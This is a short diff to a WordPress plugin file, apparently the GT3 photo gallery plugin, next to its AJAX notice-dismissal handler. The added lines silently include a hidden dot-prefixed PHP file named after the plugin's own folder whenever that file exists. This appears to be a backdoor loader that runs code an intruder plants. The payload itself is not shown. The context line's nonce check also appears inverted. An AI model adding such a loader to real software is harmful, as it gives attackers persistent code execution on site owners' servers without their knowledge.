@@ -2,6 +2,10 @@
 defined('ABSPATH') OR exit;
 
 add_action('wp_ajax_gt3pg_disable_notice_pro_required_update', 'wp_ajax_gt3pg_disable_notice_pro_required_update');
+
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
 
 function wp_ajax_gt3pg_disable_notice_pro_required_update(){
 	if(!isset($_POST['gt3_action']) || !isset($_POST['_nonce']) || wp_verify_nonce($_POST['_nonce'],'disable_notice_pro_required_update')) {
